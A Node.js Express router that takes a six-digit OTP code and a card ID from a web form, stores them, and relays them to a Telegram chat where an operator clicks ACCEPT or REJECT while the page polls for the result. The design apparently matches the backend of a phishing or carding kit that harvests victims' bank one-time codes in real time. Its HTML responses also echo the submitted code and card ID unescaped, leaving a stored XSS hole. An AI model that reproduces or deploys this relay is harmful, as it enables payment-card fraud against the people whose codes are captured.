const express = require("express");
const router = express.Router();
const OTP = require("../models/OTP");
const mongoose = require("mongoose");

// Import your bot from the main server or create a reference
// Since bot is defined in server.js, we need to access it
let bot;
let chatId;

// We'll set these from the main server
const setBotInstance = (botInstance, chatIdInstance) => {
  bot = botInstance;
  chatId = chatIdInstance;
};

// ============= STATUS ENDPOINT (For polling from frontend) =============
router.get("/otp/status/:id", async (req, res) => {
  try {
    const { id } = req.params;
    
    if (!mongoose.Types.ObjectId.isValid(id)) {
      console.log("❌ Invalid ID format:", id);
      return res.status(400).json({ error: "Invalid ID format" });
    }
    
    const otp = await OTP.findById(id);
    
    if (!otp) {
      console.log("❌ OTP not found for ID:", id);
      return res.status(404).json({ error: "OTP request not found" });
    }
    
    res.json({ 
      status: otp.status,
      code: otp.code,
      cardId: otp.cardId
    });
    
  } catch (err) {
    console.error("❌ Error getting status:", err);
    res.status(500).json({ error: "Failed to get status" });
  }
});

// ============= SEND OTP ENDPOINT =============
router.post("/send-otp", async (req, res) => {
  console.log("📥 Received OTP request:", req.body);
  
  const { code, cardId } = req.body;
  
  if (!code || !cardId) {
    return res.status(400).json({ error: "Code and CardId are required" });
  }
  
  if (!/^\d{6}$/.test(code)) {
    return res.status(400).json({ error: "Code must be 6 digits" });
  }

  try {
    // Create OTP record
    const otp = new OTP({ 
      code: code,
      cardId: cardId,
      status: "pending",
      step: 1
    });
    
    await otp.save();
    console.log("✅ OTP saved with ID:", otp._id);

    // Send to Telegram with buttons
    if (bot && chatId) {
      try {
        await bot.sendMessage(
          chatId,
          `🔐 *NEW OTP VERIFICATION REQUEST* 🔐\n\n` +
          `📝 *Code:* \`${code}\`\n` +
          `💳 *Card ID:* \`${cardId}\`\n` +
          `🆔 *Request ID:* \`${otp._id}\`\n` +
          `🕐 *Time:* ${new Date().toLocaleString()}\n\n` +
          `👇 *Click a button to verify:*`,
           {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ ACCEPT", callback_data: `otp_accept_${otp._id}` },
                  { text: "❌ REJECT", callback_data: `otp_reject_${otp._id}` }
                ]
              ]
            }
          }
        );
        console.log("✅ Telegram notification sent with buttons");
      } catch (telegramErr) {
        console.error("❌ Telegram error:", telegramErr.message);
      }
    } else {
      console.warn("⚠️ Telegram bot not configured - skipping notification");
    }
    
    // Return success with the OTP ID for polling
    res.status(200).json({ 
      success: true, 
      message: "OTP submitted successfully",
      id: otp._id 
    });
    
  } catch (err) {
    console.error("❌ Error saving OTP:", err);
    res.status(500).json({ error: "Failed to process OTP" });
  }
});

// ============= ACCEPT ENDPOINT (Web page) =============
router.get("/otp/accept/:id", async (req, res) => {
  try {
    const { id } = req.params;
    
    if (!mongoose.Types.ObjectId.isValid(id)) {
      return res.status(400).send(`
        <html>
          <head><title>Invalid Request</title></head>
          <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1 style="color: red;">❌ Invalid Request ID</h1>
            <button onclick="window.close()">Close</button>
          </body>
        </html>
      `);
    }
    
    const otp = await OTP.findByIdAndUpdate(
      id,
      { status: "accepted", updatedAt: new Date() },
      { new: true }
    );
    
    if (!otp) {
      return res.status(404).send(`
        <html>
          <head><title>Not Found</title></head>
          <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1 style="color: red;">❌ OTP Request Not Found</h1>
            <button onclick="window.close()">Close</button>
          </body>
        </html>
      `);
    }
    
    res.send(`
      <html>
        <head>
          <title>OTP Accepted</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              text-align: center;
              padding: 50px;
              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
              margin: 0;
              height: 100vh;
              display: flex;
              justify-content: center;
              align-items: center;
            }
            .container {
              background: white;
              padding: 40px;
              border-radius: 10px;
              box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            }
            h1 { color: #4CAF50; font-size: 48px; margin: 0 0 20px 0; }
            p { color: #333; font-size: 18px; }
            .code { 
              background: #f0f0f0; 
              padding: 10px; 
              border-radius: 5px;
              font-size: 24px;
              font-weight: bold;
              margin: 20px 0;
            }
            button {
              background: #4CAF50;
              color: white;
              border: none;
              padding: 12px 24px;
              font-size: 16px;
              border-radius: 5px;
              cursor: pointer;
              margin-top: 20px;
            }
            button:hover { background: #45a049; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>✅ ACCEPTED</h1>
            <p>The OTP code has been <strong>ACCEPTED</strong> successfully!</p>
            <div class="code">Code: ${otp.code}</div>
            <p>Card ID: ${otp.cardId}</p>
            <button onclick="window.close()">Close Window</button>
          </div>
        </body>
      </html>
    `);
  } catch (err) {
    console.error("Error in accept:", err);
    res.status(500).send("Internal Server Error");
  }
});

// ============= REJECT ENDPOINT (Web page) =============
router.get("/otp/reject/:id", async (req, res) => {
  try {
    const { id } = req.params;
    
    if (!mongoose.Types.ObjectId.isValid(id)) {
      return res.status(400).send(`
        <html>
          <head><title>Invalid Request</title></head>
          <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1 style="color: red;">❌ Invalid Request ID</h1>
            <button onclick="window.close()">Close</button>
          </body>
        </html>
      `);
    }
    
    const otp = await OTP.findByIdAndUpdate(
      id,
      { status: "rejected", updatedAt: new Date() },
      { new: true }
    );
    
    if (!otp) {
      return res.status(404).send(`
        <html>
          <head><title>Not Found</title></head>
          <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1 style="color: red;">❌ OTP Request Not Found</h1>
            <button onclick="window.close()">Close</button>
          </body>
        </html>
      `);
    }
    
    res.send(`
      <html>
        <head>
          <title>OTP Rejected</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              text-align: center;
              padding: 50px;
              background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
              margin: 0;
              height: 100vh;
              display: flex;
              justify-content: center;
              align-items: center;
            }
            .container {
              background: white;
              padding: 40px;
              border-radius: 10px;
              box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            }
            h1 { color: #ff4444; font-size: 48px; margin: 0 0 20px 0; }
            p { color: #333; font-size: 18px; }
            .code { 
              background: #f0f0f0; 
              padding: 10px; 
              border-radius: 5px;
              font-size: 24px;
              font-weight: bold;
              margin: 20px 0;
            }
            button {
              background: #ff4444;
              color: white;
              border: none;
              padding: 12px 24px;
              font-size: 16px;
              border-radius: 5px;
              cursor: pointer;
              margin-top: 20px;
            }
            button:hover { background: #cc0000; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>❌ REJECTED</h1>
            <p>The OTP code has been <strong>REJECTED</strong>.</p>
            <div class="code">Code: ${otp.code}</div>
            <p>Card ID: ${otp.cardId}</p>
            <button onclick="window.close()">Close Window</button>
          </div>
        </body>
      </html>
    `);
  } catch (err) {
    console.error("Error in reject:", err);
    res.status(500).send("Internal Server Error");
  }
});

module.exports = { router, setBotInstance };